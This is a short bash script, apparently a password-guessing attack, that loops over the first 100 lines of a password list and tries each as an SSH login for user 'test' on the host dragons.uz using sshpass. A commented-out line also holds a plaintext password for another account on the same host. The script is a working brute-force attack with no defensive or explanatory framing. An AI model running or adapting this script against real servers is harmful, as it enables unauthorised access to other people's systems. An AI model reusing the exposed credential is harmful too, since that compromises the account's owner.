#!/bin/bash

# out=$(sshpass -p "@dragon$" ssh dragon@dragons.uz)
for i in {1..100}
do
	pass=$(sed "${i}!d" passwords.txt)
	out=$(sshpass -p "${pass}" ssh test@dragons.uz)
	echo $i
	echo "${out}"
done
